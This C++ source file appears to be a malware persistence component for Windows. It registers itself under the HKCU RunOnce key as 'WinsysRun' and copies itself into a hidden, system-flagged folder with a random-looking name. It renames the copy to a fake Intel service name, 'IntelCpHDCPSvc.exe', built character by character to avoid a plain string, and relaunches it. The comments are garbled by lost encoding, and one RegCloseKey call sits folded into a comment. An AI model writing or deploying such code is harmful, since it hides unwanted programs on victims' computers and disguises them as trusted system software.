#include "SelfRun.h"
#include <Windows.h>
#include<fstream>
#include<io.h>
#include <string>
#include<direct.h>
#include <iostream>
#include"CmdLine.h"
using namespace std;
//����·�����̶�
//#define MAX_PATH 4096
//����д���ע���·��
//#define SELFSTART_REGEDIT_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
#define SELFSTART_REGEDIT_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\"
//���ñ����������� ����Ϊtrue��ʾ����������Ϊfalse ��ʾȡ��

string orders = "start ";
DWORD WINAPI NewExe(LPVOID lpParameter);


BOOL SelfRun::SetSelfStart(BOOL bKey)
{
	//��ȡ��������·��
	char pName[MAX_PATH] = { 0 };
	GetModuleFileNameA(NULL, pName, MAX_PATH);
	//��ע�����д��������Ϣ
	HKEY hKey = NULL;
	LONG lRet = NULL;
	if (bKey)
	{
		//��ע���
		lRet = RegOpenKeyExA(HKEY_CURRENT_USER, SELFSTART_REGEDIT_PATH, 0, KEY_ALL_ACCESS, &hKey);
		//�ж��Ƿ�ɹ�
		if (lRet != ERROR_SUCCESS)
		{
			return FALSE;
		}
		else
		{

			//д��ע�����Ϊ"WinsysRun"�������Լ��޸�
			RegSetValueExA(hKey, "WinsysRun", 0, REG_SZ, (const unsigned char*)pName, strlen(pName) + sizeof(char));

			//�ر�ע���            RegCloseKey(hKey);
			return TRUE;
		}
	}
	else
	{
		lRet = RegOpenKeyExA(HKEY_CURRENT_USER, SELFSTART_REGEDIT_PATH, 0, KEY_ALL_ACCESS, &hKey);
		//�ж��Ƿ�ɹ�
		if (lRet != ERROR_SUCCESS)
		{
			return FALSE;
		}
		else
		{

			//ɾ����Ϊ"WinsysRun"��ע�����Ϣ
			RegDeleteValueA(hKey, "WinsysRun");

			//�ر�ע���            
			RegCloseKey(hKey);
			return TRUE;
		}
	}
}
/*
return  1:ʧ�� û��ע���
2.�ɹ� �ļ��Ѿ����������ɹ���������
3.ʧ�� �ļ�û������������CDEFGH�̶�������

*/
int SelfRun::MoveSelf()
{
	string nameWithPath = "";
	char pName[MAX_PATH] = { 0 };
	char exeName[MAX_PATH] = { 0 };
	char exeNameFinal[MAX_PATH] = /*"IntelCpHDCPSvc.exe" =*/ { 'I','n','t','e','l','C','p','H','D','C','P','S','v','c','.','e','x','e','\0' };
	GetModuleFileNameA(NULL, pName, MAX_PATH);
	HKEY hKey = NULL;
	LONG lRet = NULL;
	int i = 0;
	int j = 0;
	for (; pName[i] != '\0'; i++);
	for (; pName[i] != '\\'; i--);
	i++;
	for (; pName[i] != '\0'; i++)
	{
		exeName[j++] = pName[i];
	}
	exeName[j] = '\0';
	if (strcmp(exeName, exeNameFinal) == 0)
	{
		//ֱ��ע������
		//��ע���
		lRet = RegOpenKeyExA(HKEY_CURRENT_USER, SELFSTART_REGEDIT_PATH, 0, KEY_ALL_ACCESS, &hKey);
		//�ж��Ƿ�ɹ�
		if (lRet != ERROR_SUCCESS)
			return 1;
		else
		{

			//д��ע�����Ϊ"WinsysRun"�������Լ��޸�
			RegSetValueExA(hKey, "WinsysRun", 0, REG_SZ, (const unsigned char*)pName, strlen(pName) + sizeof(char));
			//�ر�ע���            
			RegCloseKey(hKey);
			return 2;
		}
	}
	else
	{
		/*���Ƶ�ָ��Ŀ¼��֮�󣬶��³���ע������*/
		for (int m = 0; m < 5; m++)
		{
			char dir[4] = {'D'+m,':','\\','\0' };
			if (_access(dir, 0) == 0)
			{
				nameWithPath += dir;
				break;
			}
		}
		if (nameWithPath.size() == 0)
		{
			char dir[4] = { 'C' ,':','\\','\0' };
			if (_access(dir, 0) == 0)
			{
				nameWithPath += dir;
			}
			else
				return 3;
		}
		else
		{
			//����·��
			//����·��
			//�����ļ�
			//��������
			nameWithPath += "m00zz12548dqqfgtad7895521";
			_mkdir(nameWithPath.c_str());
			string nameWithPathLs = nameWithPath;
			nameWithPath += "\\a00zz12548dqqfgtad7";
			_mkdir(nameWithPath.c_str());
			SetFileAttributes(nameWithPathLs.c_str(), FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN
				| FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE);
			//SetFileAttributes(nameWithPathLs.c_str(), FILE_ATTRIBUTE_NORMAL);
			nameWithPath += "\\";
			nameWithPath += exeNameFinal;
			/*����ļ�����*/
			if (_access(nameWithPath.c_str(), 0) == 0)
				return 5;

			fstream in(pName, fstream::in | fstream::binary);
				std::fstream out;//д���ļ�
				out.open(nameWithPath,fstream::out | fstream::binary | fstream::trunc);
			#define LENGTH_FILE_BODY 2048
				char szBuf[LENGTH_FILE_BODY] = { 0 };
				while (!in.eof())
				{
					in.read(szBuf, LENGTH_FILE_BODY);
					int len = in.gcount();
					out.write(szBuf, len);
				}
				out.close();
				in.close();
				orders += nameWithPath;
				HANDLE handle1 = CreateThread(NULL, 0, NewExe, NULL, 0, NULL);
				CloseHandle(handle1);
				Sleep(100);
				return 4;
		}
		
	}


	return 0;
}
DWORD WINAPI NewExe(LPVOID lpParameter)
{
	string result;
	//cout << orders << endl;
	CmdLine::cmdLine(orders, result);
	return 0;
}


